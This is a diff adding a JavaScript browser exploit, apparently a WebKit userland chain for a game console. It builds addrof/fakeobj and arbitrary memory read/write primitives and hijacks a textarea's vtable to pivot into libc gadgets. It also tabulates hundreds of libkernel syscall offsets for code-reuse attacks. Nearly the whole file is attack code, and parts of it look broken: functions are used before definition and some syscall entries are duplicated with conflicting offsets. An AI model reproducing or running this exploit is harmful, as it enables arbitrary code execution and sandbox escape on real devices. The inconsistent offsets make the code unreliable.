@@ -1,0 +1,486 @@
+var oob_master = new Uint32Array(1024);
+var oob_slave = new Uint8Array(1024);
+var leaker_arr = new Uint32Array(1024);
+var leaker_obj = {a: 1234};
+
+write64(addrof(oob_master).add(16), addrof(oob_slave));
+write64(addrof(leaker_arr).add(16), addrof(leaker_obj));
+
+var i48_put = function(x, a) {
+  a[4] = x | 0;
+  a[5] = (x / 4294967296) | 0;
+}
+
+var i48_get = function(a) {
+  return a[4] + a[5] * 4294967296;
+}
+
+var addrof = function(x) {
+  leaker_obj.a = x;
+  return i48_get(leaker_arr);
+}
+
+var fakeobj = function(x) {
+  i48_put(x, leaker_arr);
+  return leaker_obj.a;
+}
+
+var read_mem_setup = function(p, sz) {
+  i48_put(p, oob_master);
+  oob_master[6] = sz;
+}
+
+var read_mem = function(p, sz) {
+  read_mem_setup(p, sz);
+  var arr = [];
+  for(var i = 0; i < sz; i++) {
+    arr.push(oob_slave[i]);
+  }
+  return arr;
+}
+
+var read_mem_s = function(p, sz) {
+  read_mem_setup(p, sz);
+  return "" + oob_slave;
+}
+
+var read_mem_b = function(p, sz) {
+  read_mem_setup(p, sz);
+  var b = new Uint8Array(sz);
+  b.set(oob_slave);
+  return b;
+}
+
+var read_mem_as_string = function(p, sz) {
+  var x = read_mem_b(p, sz);
+  var ans = '';
+  for(var i = 0; i < x.length; i++) {
+    ans += String.fromCharCode(x[i]);
+  }
+  return ans;
+}
+
+var write_mem = function(p, data) {
+  i48_put(p, oob_master);
+  oob_master[6] = data.length;
+  for(var i = 0; i < data.length; i++) {
+    oob_slave[i] = data[i];
+  }
+}
+
+var read_ptr_at = function(p) {
+  var ans = 0;
+  var d = read_mem(p, 8);
+  for(var i = 7; i >= 0; i--) {
+    ans = 256 * ans + d[i];
+  }
+  return ans;
+}
+
+var write_ptr_at = function(p, d) {
+  var arr = [];
+  for(var i = 0; i < 8; i++) {
+    arr.push(d & 0xff);
+    d /= 256;
+  }
+  write_mem(p, arr);
+}
+
+var hex = function(x) {
+  return (new Number(x)).toString(16);
+}
+
+var malloc_nogc = [];
+function malloc(sz) {
+  var arr = new Uint8Array(sz);
+  malloc_nogc.push(arr);
+  return read_ptr_at(addrof(arr)+0x10);
+}
+
+var tarea = document.createElement('textarea');
+
+var real_vt_ptr = read_ptr_at(addrof(tarea) + 0x18);
+var fake_vt_ptr = malloc(0x400);
+write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
+
+var real_vtable = read_ptr_at(fake_vt_ptr);
+var fake_vtable = malloc(0x2000);
+write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
+write_ptr_at(fake_vt_ptr, fake_vtable);
+
+var fake_vt_ptr_bak = malloc(0x400);
+write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
+
+var plt_ptr = read_ptr_at(fake_vtable) - 10142888;
+
+function get_got_addr(idx) {
+  var p = plt_ptr + idx * 16;
+  var q = read_mem(p, 6);
+  if(q[0] != 0xff || q[1] != 0x25) {
+    throw "invalid GOT entry";
+  }
+  var offset = 0;
+  for(var i = 5; i >= 2; i--) {
+    offset = offset * 256 + q[i];
+  }
+  offset += p + 6;
+  return read_ptr_at(offset);
+}
+
+// These are not real bases but rather some low addresses
+var webkit_base = read_ptr_at(fake_vtable) - 0x900000;
+var libkernel_base = get_got_addr(789);
+var libc_base = get_got_addr(573);
+var saveall_addr = libc_base + 0x22a94;
+var loadall_addr = libc_base + 0x26ee8;
+//var setjmp_addr = libc_base+0x21663a;
+//var longjmp_addr = libc_base+0x21668a;
+var pivot_addr = libc_base + 0x26f5e;
+var infloop_addr = libc_base + 0x393f0;
+var jop_frame_addr = libc_base + 0x669b0;
+var get_errno_addr_addr = libkernel_base + 0x11810;
+var pthread_create_addr = libkernel_base + 0x17190;
+
+// Syscalls
+var sigtimedwait_addr = libkernel_base + 0x26720;
+var sigwaitinfo_addr = libkernel_base + 0x26740;
+var evf_set_addr = libkernel_base + 0x26760;
+var sigaction_addr = libkernel_base + 0x26780;
+var pselect_addr = libkernel_base + 0x267a0;
+var cpumode_yield_addr = libkernel_base + 0x267c0;
+var dynlib_get_list_for_libdbg_addr = libkernel_base + 0x267e0;
+var blockpool_map_addr = libkernel_base + 0x26800;
+var netgetiflist_addr = libkernel_base + 0x26820;
+var fstatfs_addr = libkernel_base + 0x26840;
+var sigprocmask_addr = libkernel_base + 0x26860;
+var socket_addr = libkernel_base + 0x26880;
+var fpathconf_addr = libkernel_base + 0x268a0;
+var osem_trywait_addr = libkernel_base + 0x268c0;
+var get_paging_stats_of_all_threads_addr = libkernel_base + 0x268e0;
+var ksem_unlink_addr = libkernel_base + 0x26900;
+var socketpair_addr = libkernel_base + 0x26920;
+var localtime_to_utc_addr = libkernel_base + 0x26940;
+var get_cpu_usage_all_addr = libkernel_base + 0x26960;
+var dynlib_get_obj_member_addr = libkernel_base + 0x26980;
+var getdtablesize_addr = libkernel_base + 0x269a0;
+var wait4_addr = libkernel_base + 0x269c0;
+var reserve_2mb_page_addr = libkernel_base + 0x269e0;
+var fsync_addr = libkernel_base + 0x26a00;
+var getrusage_addr = libkernel_base + 0x26a20;
+var thr_suspend_addr = libkernel_base + 0x26a40;
+var blockpool_unmap_addr = libkernel_base + 0x26a60;
+var ftruncate_addr = libkernel_base + 0x26a80;
+var ksem_init_addr = libkernel_base + 0x26aa0;
+var revoke_addr = libkernel_base + 0x26ac0;
+var evf_trywait_addr = libkernel_base + 0x26ae0;
+var dynlib_get_info_for_libdbg_addr = libkernel_base + 0x26b00;
+var mlockall_addr = libkernel_base + 0x26b20;
+var getsid_addr = libkernel_base + 0x26b40;
+var chmod_addr = libkernel_base + 0x26b60;
+var get_proc_type_info_addr = libkernel_base + 0x26b80;
+var mdbg_service_addr = libkernel_base + 0x26ba0;
+var sched_yield_addr = libkernel_base + 0x26bc0;
+var sched_setparam_addr = libkernel_base + 0x26be0;
+var aio_suspend_addr = libkernel_base + 0x26c00;
+var dmem_container_addr = libkernel_base + 0x26c20;
+var thr_set_ucontext_addr = libkernel_base + 0x26c40;
+var aio_create_addr = libkernel_base + 0x26c60;
+var thr_kill_addr = libkernel_base + 0x26c80;
+var blockpool_move_addr = libkernel_base + 0x26ca0;
+var mincore_addr = libkernel_base + 0x26cc0;
+var get_self_auth_info_addr = libkernel_base + 0x26ce0;
+var pwrite_addr = libkernel_base + 0x26d00;
+var setsockopt_addr = libkernel_base + 0x26d20;
+var is_in_sandbox_addr = libkernel_base + 0x26d40;
+var connect_addr = libkernel_base + 0x26d60;
+var set_timezone_info_addr = libkernel_base + 0x26d80;
+var setrlimit_addr = libkernel_base + 0x26da0;
+var dl_get_list_addr = libkernel_base + 0x26dc0;
+var getpeername_addr = libkernel_base + 0x26de0;
+var get_gpo_addr = libkernel_base + 0x26e00;
+var chflags_addr = libkernel_base + 0x26e20;
+var ksem_getvalue_addr = libkernel_base + 0x26e40;
+var dynlib_get_info_addr = libkernel_base + 0x26e60;
+var evf_delete_addr = libkernel_base + 0x26e80;
+var sched_getscheduler_addr = libkernel_base + 0x26ea0;
+var mname_addr = libkernel_base + 0x26ec0;
+var adjtime_addr = libkernel_base + 0x26ee0;
+var lstat_addr = libkernel_base + 0x26f00;
+var rmdir_addr = libkernel_base + 0x26f20;
+var dynlib_load_prx_addr = libkernel_base + 0x26f40;
+var kldunloadf_addr = libkernel_base + 0x26f60;
+var ksem_trywait_addr = libkernel_base + 0x26f80;
+var dynlib_get_info2_addr = libkernel_base + 0x26fa0;
+var ksem_post_addr = libkernel_base + 0x26fc0;
+var setreuid_addr = libkernel_base + 0x26fe0;
+var ioctl_addr = libkernel_base + 0x27000;
+var clock_gettime_addr = libkernel_base + 0x27020;
+var budget_get_ptype_addr = libkernel_base + 0x27040;
+var opmc_get_hw_addr = libkernel_base + 0x27060;
+var sigsuspend_addr = libkernel_base + 0x27080;
+var netcontrol_addr = libkernel_base + 0x270a0;
+var utimes_addr = libkernel_base + 0x270c0;
+var aio_multi_wait_addr = libkernel_base + 0x270e0;
+var fstat_addr = libkernel_base + 0x27100;
+var blockpool_batch_addr = libkernel_base + 0x27120;
+var ktimer_create_addr = libkernel_base + 0x27140;
+var setregid_addr = libkernel_base + 0x27160;
+var aio_submit_addr = libkernel_base + 0x27180;
+var ksem_timedwait_addr = libkernel_base + 0x271a0;
+var socketclose_addr = libkernel_base + 0x271c0;
+var setuid_addr = libkernel_base + 0x271e0;
+var osem_close_addr = libkernel_base + 0x27200;
+var jitshm_create_addr = libkernel_base + 0x27220;
+var getuid_addr = libkernel_base + 0x27240;
+var munmap_addr = libkernel_base + 0x27260;
+var ksem_wait_addr = libkernel_base + 0x27280;
+var ksem_destroy_addr = libkernel_base + 0x272a0;
+var sched_get_priority_max_addr = libkernel_base + 0x272c0;
+var regmgr_call_addr = libkernel_base + 0x272e0;
+var poll_addr = libkernel_base + 0x27300;
+var getdents_addr = libkernel_base + 0x27320;
+var clock_settime_addr = libkernel_base + 0x27340;
+var ktimer_settime_addr = libkernel_base + 0x27360;
+var process_terminate_addr = libkernel_base + 0x27380;
+var ksem_open_addr = libkernel_base + 0x273a0;
+var execve_addr = libkernel_base + 0x273c0;
+var get_resident_fmem_count_addr = libkernel_base + 0x273e0;
+var mkdir_addr = libkernel_base + 0x27400;
+var thr_exit_addr = libkernel_base + 0x27420;
+var sigaltstack_addr = libkernel_base + 0x27440;
+var dynlib_process_needed_and_relocate_addr = libkernel_base + 0x27460;
+var getpid_addr = libkernel_base + 0x27480;
+var rdup_addr = libkernel_base + 0x274a0;
+var rfork_addr = libkernel_base + 0x274c9;
+var sys_exit_addr = libkernel_base + 0x274ea;
+var batch_map_addr = libkernel_base + 0x27510;
+var cpuset_setaffinity_addr = libkernel_base + 0x27530;
+var _umtx_unlock_addr = libkernel_base + 0x27550;
+var get_page_table_stats_addr = libkernel_base + 0x27570;
+var evf_clear_addr = libkernel_base + 0x27590;
+var dynlib_get_list2_addr = libkernel_base + 0x275b0;
+var munlockall_addr = libkernel_base + 0x275d0;
+var getppid_addr = libkernel_base + 0x275f0;
+var evf_create_addr = libkernel_base + 0x27610;
+var shm_unlink_addr = libkernel_base + 0x27630;
+var sched_getparam_addr = libkernel_base + 0x27650;
+var access_addr = libkernel_base + 0x27670;
+var lseek_addr = libkernel_base + 0x27690;
+var getrlimit_addr = libkernel_base + 0x276b0;
+var unlink_addr = libkernel_base + 0x276d0;
+var opmc_disable_addr = libkernel_base + 0x276f0;
+var osem_cancel_addr = libkernel_base + 0x27710;
+var getlogin_addr = libkernel_base + 0x27730;
+var writev_addr = libkernel_base + 0x27750;
+var netgetsockinfo_addr = libkernel_base + 0x27770;
+var dup_addr = libkernel_base + 0x27790;
+var recvmsg_addr = libkernel_base + 0x277b0;
+var futimes_addr = libkernel_base + 0x277d0;
+var get_kernel_mem_statistics_addr = libkernel_base + 0x277f0;
+var thr_get_ucontext_addr = libkernel_base + 0x27810;
+var sigprocmask_addr = libkernel_base + 0x27833;
+var thr_get_name_addr = libkernel_base + 0x278c0;
+var virtual_query_addr = libkernel_base + 0x278e0;
+var virtual_query_all_addr = libkernel_base + 0x27900;
+var chdir_addr = libkernel_base + 0x27920;
+var getegid_addr = libkernel_base + 0x27940;
+var get_sdk_compiled_version_addr = libkernel_base + 0x27960;
+var kevent_addr = libkernel_base + 0x27980;
+var get_vm_map_timestamp_addr = libkernel_base + 0x279a0;
+var sysarch_addr = libkernel_base + 0x279c0;
+var thr_create_addr = libkernel_base + 0x279e0;
+var jitshm_alias_addr = libkernel_base + 0x27a00;
+var close_addr = libkernel_base + 0x27a20;
+var profil_addr = libkernel_base + 0x27a40;
+var rtprio_thread_addr = libkernel_base + 0x27a60;
+var settimeofday_addr = libkernel_base + 0x27a80;
+var cpuset_getaffinity_addr = libkernel_base + 0x27aa0;
+var get_resident_count_addr = libkernel_base + 0x27ac0;
+var opmc_get_ctr_addr = libkernel_base + 0x27ae0;
+var sched_get_priority_min_addr = libkernel_base + 0x27b00;
+var opmc_set_ctr_addr = libkernel_base + 0x27b20;
+var mmap_dmem_addr = libkernel_base + 0x27b40;
+var sigreturn_addr = libkernel_base + 0x27b60;
+var nanosleep_addr = libkernel_base + 0x27b80;
+var select_addr = libkernel_base + 0x27ba0;
+var evf_close_addr = libkernel_base + 0x27bc0;
+var openat_addr = libkernel_base + 0x27be0;
+var aio_multi_cancel_addr = libkernel_base + 0x27c00;
+var kqueue_addr = libkernel_base + 0x27c20;
+var osem_post_addr = libkernel_base + 0x27c40;
+var setgroups_addr = libkernel_base + 0x27c60;
+var reboot_addr = libkernel_base + 0x27c80;
+var dup2_addr = libkernel_base + 0x27ca0;
+var fchflags_addr = libkernel_base + 0x27cc0;
+var get_phys_page_size_addr = libkernel_base + 0x27ce0;
+var dynlib_do_copy_relocations_addr = libkernel_base + 0x27d00;
+var stat_addr = libkernel_base + 0x27d20;
+var utc_to_localtime_addr = libkernel_base + 0x27d40;
+var evf_cancel_addr = libkernel_base + 0x27d60;
+var open_addr = libkernel_base + 0x27d80;
+var set_uevt_addr = libkernel_base + 0x27da0;
+var getgroups_addr = libkernel_base + 0x27dc0;
+var sched_rr_get_interval_addr = libkernel_base + 0x27de0;
+var getsockname_addr = libkernel_base + 0x27e00;
+var query_memory_protection_addr = libkernel_base + 0x27e20;
+var ktimer_delete_addr = libkernel_base + 0x27e40;
+var netabort_addr = libkernel_base + 0x27e60;
+var thr_wake_addr = libkernel_base + 0x27e80;
+var getcontext_addr = libkernel_base + 0x27ea4;
+var sys_exit_addr = libkernel_base + 0x27ed0;
+var sched_setscheduler_addr = libkernel_base + 0x27ef0;
+var evf_open_addr = libkernel_base + 0x27f10;
+var recvfrom_addr = libkernel_base + 0x27f30;
+var opmc_set_hw_addr = libkernel_base + 0x27f50;
+var dl_get_info_addr = libkernel_base + 0x27f70;
+var bind_addr = libkernel_base + 0x27f90;
+var opmc_set_ctl_addr = libkernel_base + 0x27fb0;
+var blockpool_open_addr = libkernel_base + 0x27fd0;
+var dynlib_get_list_addr = libkernel_base + 0x27ff0;
+var aio_submit_cmd_addr = libkernel_base + 0x28010;
+var thr_new_addr = libkernel_base + 0x28030;
+var ipmimgr_call_addr = libkernel_base + 0x28050;
+var munlock_addr = libkernel_base + 0x28070;
+var mmap_addr = libkernel_base + 0x28090;
+var getgid_addr = libkernel_base + 0x280b0;
+var osem_open_addr = libkernel_base + 0x280d0;
+var aio_multi_delete_addr = libkernel_base + 0x280f0;
+var opmc_enable_addr = libkernel_base + 0x28110;
+var clock_getres_addr = libkernel_base + 0x28130;
+var set_chicken_switches_addr = libkernel_base + 0x28150;
+var getpriority_addr = libkernel_base + 0x28170;
+var read_addr = libkernel_base + 0x28190;
+var osem_delete_addr = libkernel_base + 0x281b0;
+var setegid_addr = libkernel_base + 0x281d0;
+var sync_addr = libkernel_base + 0x281f0;
+var get_cpu_usage_proc_addr = libkernel_base + 0x28210;
+var sigqueue_addr = libkernel_base + 0x28230;
+var fork_addr = libkernel_base + 0x28250;
+var get_authinfo_addr = libkernel_base + 0x28270;
+var madvise_addr = libkernel_base + 0x28290;
+var swapcontext_addr = libkernel_base + 0x282b0;
+var namedobj_create_addr = libkernel_base + 0x282d0;
+var dynlib_unload_prx_addr = libkernel_base + 0x282f0;
+var issetugid_addr = libkernel_base + 0x28310;
+var readv_addr = libkernel_base + 0x28330;
+var mprotect_addr = libkernel_base + 0x28350;
+var test_debug_rwmem_addr = libkernel_base + 0x28370;
+var fdatasync_addr = libkernel_base + 0x28390;
+var osem_wait_addr = libkernel_base + 0x283b0;
+var ktimer_gettime_addr = libkernel_base + 0x283d0;
+var rename_addr = libkernel_base + 0x283f0;
+var kill_addr = libkernel_base + 0x28410;
+var flock_addr = libkernel_base + 0x28430;
+var write_addr = libkernel_base + 0x28450;
+var app_state_change_addr = libkernel_base + 0x28470;
+var pathconf_addr = libkernel_base + 0x28490;
+var ktimer_getoverrun_addr = libkernel_base + 0x284b0;
+var seteuid_addr = libkernel_base + 0x284d0;
+var socketex_addr = libkernel_base + 0x284f0;
+var thr_resume_ucontext_addr = libkernel_base + 0x28510;
+var randomized_path_addr = libkernel_base + 0x28530;
+var _umtx_lock_addr = libkernel_base + 0x28550;
+var setitimer_addr = libkernel_base + 0x28570;
+var execve_addr = libkernel_base + 0x2859d;
+var accept_addr = libkernel_base + 0x285c0;
+var get_paging_stats_of_all_objects_addr = libkernel_base + 0x285e0;
+var getsockopt_addr = libkernel_base + 0x28600;
+var pwritev_addr = libkernel_base + 0x28620;
+var _umtx_op_addr = libkernel_base + 0x28640;
+var preadv_addr = libkernel_base + 0x28650;
+var dynlib_get_info_ex_addr = libkernel_base + 0x28680;
+var debug_init_addr = libkernel_base + 0x286a0;
+var dynlib_get_proc_param_addr = libkernel_base + 0x286c0;
+var set_vm_container_addr = libkernel_base + 0x286e0;
+var ksem_close_addr = libkernel_base + 0x28700;
+var aio_get_data_addr = libkernel_base + 0x28720;
+var fchmod_addr = libkernel_base + 0x28740;
+var sendfile_addr = libkernel_base + 0x28760;
+var aio_multi_poll_addr = libkernel_base + 0x28780;
+var mlock_addr = libkernel_base + 0x287a0;
+var sigwait_addr = libkernel_base + 0x287c0;
+var evf_wait_addr = libkernel_base + 0x287e0;
+var workaround8849_addr = libkernel_base + 0x28800;
+var shm_open_addr = libkernel_base + 0x28820;
+var _umtx_op_addr = libkernel_base + 0x28840;
+var sendto_addr = libkernel_base + 0x28860;
+var free_stack_addr = libkernel_base + 0x28930;
+var shutdown_addr = libkernel_base + 0x28950;
+var thr_set_name_addr = libkernel_base + 0x28970;
+var listen_addr = libkernel_base + 0x28990;
+var physhm_unlink_addr = libkernel_base + 0x289b0;
+var thr_suspend_ucontext_addr = libkernel_base + 0x289d0;
+var __sysctl_addr = libkernel_base + 0x289f0;
+var thr_kill2_addr = libkernel_base + 0x28a10;
+var osem_create_addr = libkernel_base + 0x28a30;
+var thr_self_addr = libkernel_base + 0x28a50;
+var setsid_addr = libkernel_base + 0x28a70;
+var physhm_open_addr = libkernel_base + 0x28a90;
+var get_map_statistics_addr = libkernel_base + 0x28ab0;
+var setpriority_addr = libkernel_base + 0x28ad0;
+var msync_addr = libkernel_base + 0x28af0;
+var gettimeofday_addr = libkernel_base + 0x28b10;
+var setcontext_addr = libkernel_base + 0x28b30;
+var kqueueex_addr = libkernel_base + 0x28b50;
+var pipe_addr = libkernel_base + 0x28b70;
+var sandbox_path_addr = libkernel_base + 0x28ba0;
+var setlogin_addr = libkernel_base + 0x28bc0;
+var getitimer_addr = libkernel_base + 0x28bf0;
+var dynlib_dlsym_addr = libkernel_base + 0x28c10;
+var dl_get_metadata_addr = libkernel_base + 0x28c30;
+var get_bio_usage_all_addr = libkernel_base + 0x28c50;
+var getdirentries_addr = libkernel_base + 0x28c70;
+var set_phys_fmem_limit_addr = libkernel_base + 0x28c90;
+var is_development_mode_addr = libkernel_base + 0x28cb0;
+var mtypeprotect_addr = libkernel_base + 0x28cd0;
+var aio_init_addr = libkernel_base + 0x28cf0;
+var sigpending_addr = libkernel_base + 0x28d10;
+var pread_addr = libkernel_base + 0x28d30;
+var cpuset_getid_addr = libkernel_base + 0x28d50;
+var geteuid_addr = libkernel_base + 0x28d70;
+var fcntl_addr = libkernel_base + 0x28d90;
+var uuidgen_addr = libkernel_base + 0x28db0;
+var set_gpo_addr = libkernel_base + 0x28dd0;
+var sendmsg_addr = libkernel_base + 0x28df0;
+var truncate_addr = libkernel_base + 0x28e10;
+var namedobj_delete_addr = libkernel_base + 0x28e30;
+
+function saveall() {
+  var ans = malloc(0x800);
+  var bak = read_ptr_at(fake_vtable + 0x1d8);
+  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
+  write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
+  tarea.scrollLeft = 0;
+  write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
+  write_mem(ans, read_mem(fake_vt_ptr, 0x400));
+  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+  var bak = read_ptr_at(fake_vtable + 0x1d8);
+  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
+  write_ptr_at(fake_vt_ptr + 0x38, 0x1234);
+  write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
+  tarea.scrollLeft = 0;
+  write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
+  write_mem(ans + 0x400, read_mem(fake_vt_ptr, 0x400));
+  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+  return ans;
+}
+
+function pivot(buf) {
+  var ans = malloc(0x400);
+  var bak = read_ptr_at(fake_vtable + 0x1d8);
+  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
+  write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
+  tarea.scrollLeft = 0;
+  write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
+  write_mem(ans, read_mem(fake_vt_ptr, 0x400));
+  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+  var bak = read_ptr_at(fake_vtable + 0x1d8);
+  write_ptr_at(fake_vtable + 0x1d8, pivot_addr);
+  write_ptr_at(fake_vt_ptr + 0x38, buf);
+  write_ptr_at(ans + 0x38, read_ptr_at(ans + 0x38) - 16);
+  write_ptr_at(buf, ans);
+  write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
+  tarea.scrollLeft = 0;
+  write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
+  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+}
